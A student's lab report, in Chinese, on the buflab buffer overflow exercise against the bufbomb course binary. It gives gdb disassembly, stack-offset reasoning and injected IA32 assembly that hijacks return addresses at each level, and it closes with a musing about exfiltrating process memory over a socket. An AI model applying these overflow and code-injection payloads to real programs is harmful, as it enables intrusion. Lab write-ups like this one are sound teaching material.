# buflab实验报告
***

## 实验原理

### Level0

#### 思路：

* test函数调用getbuf()函数时，先将返回地址压入栈中，再将eip指向getbuf()函数首句指令的地址
* 找到返回地址的地址，并将该地址的值修改成为smoke()函数首句指令的地址

#### 步骤：

* ubuntu16.04系统环境下运行gdb

```c
//加载可执行文件
>>> file bufbomb
//反编译smoke函数，拿到起始地址,为0x08048b04
>>> disassem smoke

>>> 0x08048b04 <+0>:	push   %ebp
    0x08048b05 <+1>:	mov    %esp,%ebp
    0x08048b07 <+3>:	sub    $0x18,%esp
    0x08048b0a <+6>:	movl   $0x804a5b0,(%esp)
    0x08048b11 <+13>:	call   0x8048900 <puts@plt>
    0x08048b16 <+18>:	movl   $0x0,(%esp)
    0x08048b1d <+25>:	call   0x804942e <validate>
    0x08048b22 <+30>:	movl   $0x0,(%esp)
    0x08048b29 <+37>:	call   0x8048920 <exit@plt>

//反编译getbuf函数，观察其栈帧结构
>>> disassem getbuf

>>> 0x08049284 <+0>:	push   %ebp
    0x08049285 <+1>:	mov    %esp,%ebp
    0x08049287 <+3>:	sub    $0x38,%esp
    0x0804928a <+6>:	lea    -0x28(%ebp),%eax
    0x0804928d <+9>:	mov    %eax,(%esp)
    0x08049290 <+12>:	call   0x8048d66 <Gets>
    0x08049295 <+17>:	mov    $0x1,%eax
    0x0804929a <+22>:	leave  
    0x0804929b <+23>:	ret 

//打断点并监测中断时的寄存器值，拿到不同情况下的ebp和eip
>>> break getbuf
>>> run -u 2016013239
>>> -c
>>> info integers
>>> -c
>>> info integers


```

* getbuf函数中，eax指向char buf[32]的起始地址
* eax与旧ebp的存储地址相差 2 * 16 + 8 = 40个字节
* 旧ebp使用4个字节存储，再上方即为返回地址

#### 答案（注意使用小端存储）
40个占位字节（非结束符）+ test的ebp + smoke的返回地址

***

### Level1

#### 思路：
* 与level0大致相同，但要传参数，故需要将溢出覆盖到参数位置上
* 在正常调用fizz函数时，第一个参数的位置为ebp+8

#### 答案：
40个占位字节（非结束符）+ test的ebp + smoke的返回地址 + 4个占位字节 + cookie的值

*** 

### level2

#### 思路：
* 观察反汇编代码，得到缓冲区入口地址和全局变量的地址
* 将getbuf()的返回地址指向缓冲区的起始地址
* 函数返回后，会先执行缓冲区中注入的可执行的机器指令（精心设计）
* 执行目的指令(修改global)后，push bang()函数的起始地址，再调用ret指令，使eip指向bang()函数，跳转完成

```c
//juice.s
movl $0x5d434ea2,%eax
movl %eax,0x804e10c
pushl $0x08048b82
ret
```
```c
//将汇编代码写进juice.s文件中，编译得到可执行文件
>>> gcc -m32 -c juice.s
//反汇编查看机器指令
>>> objdump -d juice.o
```

####答案：
反编译得到的机器指令 + 占位字节 + 返回地址(缓冲区地址）

***
### level3
#### 思路：
* 向缓冲区注入代码修改返回寄存器eax的值，让其等于cookie，修改ebp使其等于test函数运行时的ebp
* 观察test()函数，得到调用getbuf()函数的下一行指令的地址
* 将地址压栈，再ret

```c
//test函数
0x08048be0 <+0>:	push   %ebp
...
0x08048bee <+14>:	call   0x8049284 <getbuf>
0x08048bf3 <+19>:	mov    %eax,-0xc(%ebp)
...
0x08048c28 <+72>:	mov    %eax,(%esp)
```
```c
//juice.s
movl $0x55683be0,%ebp
movl $0x5d434ea2,%eax
pushl $0x08048bf3
ret
```
#### 答案：
反编译得到的机器指令 + 占位字节 + 返回地址(缓冲区地址）

***
### level4
#### 思路：
* 需要调用5次getbufn()函数，且必须准确返回到testn()函数中
* 虽然写字符串会覆盖掉旧的ebp，使得getbufn结束跳转到攻击代码时ebp的值不能正常恢复
* 在getbufn的最后，esp已经被正常恢复到testn调用getbufn之前的状态
* 而testn中，esp = ebp - 0x28，凭借此关系恢复ebp

```c
//juice.s
leal 0x28(%esp),%ebp
movl $0x5d434ea2,%eax
pushl $0x08048c67
ret
```
#### 答案：
占位nop指令 + 反编译得到的机器指令 （共计528字节 = 0x208 + 8）

***

## 实验感想
* 在IA32汇编指令中立即数操作和指针数操作不同
	* mov 0x12345678,%eax代表将该地址的值赋给eax
	* mov $0x12345678,%eax代表将值本身赋给eax
	* 我中了这个坑

* 为提高实验效率，应当先打印所有相关函数的反汇编结果以及断点运行下不同状态的寄存器的值，记录关键信息

* 本次实验让我对缓冲区溢出理解更加深刻，我也想到了更多神奇的溢出区攻击方法，以后编程中，需要加以防范：

	1、注入死循环的机器指令  
	2、一个缓冲区漏洞长度有限，可否通过建立一个socket，不断向外发送已经读取的进程的数据区，代码区，实现全偷盗
